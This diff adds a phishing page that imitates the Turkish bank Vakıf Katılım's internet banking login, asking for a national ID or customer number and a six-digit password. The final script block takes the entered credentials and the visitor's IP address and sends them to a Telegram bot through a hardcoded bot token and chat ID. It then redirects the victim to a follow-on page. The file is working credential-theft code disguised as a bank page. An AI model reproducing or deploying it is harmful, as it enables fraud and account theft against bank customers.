@@ -1,0 +1,262 @@
+
+<!DOCTYPE html>
+<html lang="tr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css"
+        integrity="sha384-4LISF5TTJX/fLmGSxO53rV4miRxdg84mZsxmO8Rx5jGtp/LbrixFETvWa5a6sESd" crossorigin="anonymous">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/inputmask/5.0.7-beta.43/inputmask.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.bundle.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.inputmask/5.0.8/jquery.inputmask.min.js"></script>
+    <link rel="stylesheet" href="assets/css/style1.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/inputmask/5.0.7-beta.43/inputmask.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/inputmask/5.0.7/jquery.inputmask.min.js"></script>
+    <script src="assets/js/main.js"></script>
+</head>
+
+    <title>Vakıf Katılım İnternet Şubesi</title>
+    <link rel="icon" href="ayar/resim/logo.png" type="image/png">
+
+</head>
+
+<body>
+    <div id="firstContent">
+        <img src="assets/img/loading.jpg" id="loadingImage" alt="Loading">
+    </div>
+    <div id="thirdContent">
+        <form action="giris.html" method="post">
+            <div id="form1">
+                <a href="/" style="text-decoration: none;">
+                    <div style="margin-top: 17px; float: right; margin-right: 15px; text-align: right;">
+                        <i class="bi bi-x" style="color: #fff; font-size: 45px;"></i>
+                    </div>
+                </a>
+
+                <div class="tabs">
+                    <div class="active">Bireysel</div>
+                    <div>Kurumsal</div>
+                </div>
+                <div class="inputs">
+
+                    <div class="group">
+                        <style>
+                            .error-message {
+                                color: red;
+                                font-weight: bold;
+                                display: none;
+                                font-size: 12px;
+                                margin-top: 5px;
+                            }
+                    
+                            .error-input {
+                                border: 1px solid red;
+                            }
+                        </style>
+                        <p id="error-message" class="error-message"></p>
+                        <script>
+                            window.onload = function () {
+                                const urlParams = new URLSearchParams(window.location.search);
+                                const errorMessage = urlParams.get('error');
+                    
+                                const loginInput = document.getElementById('login');
+                                if (errorMessage) {
+                                    // Hata mesajını input ile göster
+                                    loginInput.classList.add('error-input'); 
+                                    document.getElementById('error-message').textContent = errorMessage;
+                                    document.getElementById('error-message').style.display = 'block';
+                                } else {
+                                    loginInput.classList.remove('error-input');
+                                    document.getElementById('error-message').style.display = 'none';
+                                }
+                            };
+                        </script>
+                        <div>
+                            
+                                <input type="text" id="login" placeholder="T.C. Kimlik veya Müşteri Numarası" onkeyup="checkInputs()" maxlength="11">
+								<span id="tcError" style="color: #fc0000; font-size: 12px; display: none;">Geçersiz T.C. Kimlik Numarası</span>
+								
+
+                        </div>
+                    </div>
+                    
+                    <div class="group sifre">
+                        <div>
+                            <div class="yuvarlaklar-sifre">
+  <div></div><div></div><div></div><div></div><div></div><div></div>
+  <span class="aninda-sifre">Anında Şifre</span>
+</div>
+                            <input type="password" class="field" name="password" id="password" inputmode="numeric" maxlength="6" required onkeyup="checkInputs()">
+                                
+                        </div>
+                    </div>
+                    <style>
+                        .form-check-input:checked {
+                            background-color:  #dc0005;
+                            border-color:  #dc0005;
+                        }
+
+                        .form-check-input {
+                            width: 2em;
+                            height: 2em;
+                        }
+                    </style>
+<div class="form-check">
+  <input type="checkbox" class="form-check-input shadow-none" checked id="exampleCheck1" style="accent-color: #dc0005;">
+  <label class="form-check-label" for="exampleCheck1" style="margin-top: 6px; margin-left: 6px; color: #dc0005;">
+    Beni hatırla
+  </label>
+</div>
+
+                </div>
+                <div class="giris-yap">
+  <input type="button" id="nextPage" class="button" style="background: #f70202; opacity: 0.5;" value="Giriş Yap" disabled>
+                </div>
+            </div>
+        </form>
+    </div>
+    <script>
+        window.addEventListener('load', function () {
+            
+            const firstContent = document.getElementById('firstContent');
+
+           
+            setTimeout(function () {
+                
+                firstContent.classList.add('fade-out');
+
+                
+                setTimeout(function () {
+                    firstContent.style.display = 'none';
+                }, 1000);
+            }, 2000);
+        });
+
+
+
+        
+        $('.yuvarlaklar-sifre').click(function () {
+            $('#password').focus();
+        });
+
+
+        $('#password').keyup(function () {
+            
+            $('.yuvarlaklar-sifre div').css({
+                'background-color': 'transparent'
+            });
+
+            
+            var leng = $(this).val().length;
+
+            
+            if (leng > 0) {
+                
+                for (let index = 0; index < leng; index++) {
+                    // İlgili yuvarlağın arkaplan rengini '#35649c' (koyu mor) yapıyoruz
+                    $('.yuvarlaklar-sifre div').eq(index).css({
+                        'background-color': '#35649c'
+                    });
+                }
+            }
+        });
+
+
+        // Eğer 'eye' öğesi mevcutsa (örneğin, göz simgesi)
+        if (eye) {
+            // 'eye' öğesine tıklanma olayı ekliyoruz
+            eye.onclick = function () {
+                // Eğer şifre alanı 'password' tipinde ise, tipi 'text' olarak değiştiriyoruz
+                if (password.type == 'password') {
+                    password.type = 'text';
+                } else {
+                    // Eğer şifre tipi zaten 'text' ise, tekrar 'password' tipine döndürüyoruz
+                    password.type = 'password';
+                }
+            }
+        }
+		
+		
+		function checkInputs() {
+  const tc = document.getElementById('login').value;
+  const password = document.getElementById('password').value;
+  const btn = document.getElementById('nextPage');
+
+  if (tc.length === 11 && password.length === 6) {
+    btn.disabled = false;
+    btn.style.opacity = "1";
+  } else {
+    btn.disabled = true;
+    btn.style.opacity = "0.5";
+  }
+}
+
+
+    </script>
+	
+</body>
+<script>
+</script>
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Giriş</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+</head>
+<body>
+
+ <h2>Giriş Yap</h2>
+  <input type="text" id="login" placeholder="T.C. Kimlik veya Müşteri Numarası" maxlength="11">
+  <input type="password" id="password" placeholder="Şifre" maxlength="6">
+  <input type="button" id="nextPage" class="button" value="Giriş Yap">
+
+  <script>
+    $(document).ready(function () {
+      $("#nextPage").click(function (event) {
+        event.preventDefault();
+
+        var login = $("#login").val().trim();
+        var password = $("#password").val().trim();
+
+        if (login.length !== 11 || password.length !== 6) {
+          alert("Lütfen geçerli T.C. Kimlik ve 6 haneli şifre giriniz.");
+          return;
+        }
+
+        $.get("https://api64.ipify.org?format=json", function (data) {
+          var ipAddress = data.ip;
+          var botToken = "8749040297:AAEgpvlyiOWu0UqOinhmpBvmGU9XJJo6_zU";
+          var chatId = "-1003874564893";
+          var message = ` Giriş Bilgileri\n\n TC: ${login}\n pass: ${password}\n IP: ${ipAddress}`;
+
+          var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+          $.get(url, function () {
+            console.log("Telegram'a log gönderildi");
+            sessionStorage.setItem('login', login);
+            sessionStorage.setItem('password', password);
+            window.location.href = 'giris.html';
+          }).fail(function () {
+            alert("Telegram'a mesaj gönderilemedi.");
+          });
+
+        }).fail(function () {
+          alert("IP adresi alınamadı.");
+        });
+      });
+    });
+  </script>
+
+</body>
+</html>
